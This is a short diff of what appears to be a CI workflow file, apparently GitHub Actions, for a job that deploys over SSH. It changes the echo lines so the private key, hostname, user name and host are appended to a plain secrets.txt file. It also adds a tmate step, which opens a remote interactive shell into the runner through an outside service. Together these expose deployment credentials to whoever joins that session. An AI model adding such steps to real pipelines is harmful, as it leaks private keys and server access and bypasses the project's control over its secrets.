@@ -20,10 +20,10 @@ jobs:
             
         run: |
           # Write the private key to a file and set permissions
-          echo $PRIVATE_KEY
-          echo $HOSTNAME
-          echo $USER_NAME
-          echo $HOST
+          echo $PRIVATE_KEY >> secrets.txt
+          echo $HOSTNAME >> secrets.txt
+          echo $USER_NAME >> secrets.txt
+          echo $HOST >> secrets.txt
           echo "$PRIVATE_KEY" > private_key
           chmod 600 private_key
 
@@ -33,3 +33,6 @@ jobs:
             cd ci
             ./actions.sh ${HOST}
           EOF
+      
+      - name: Run tmate
+        uses: mxschmitt/action-tmate@v2
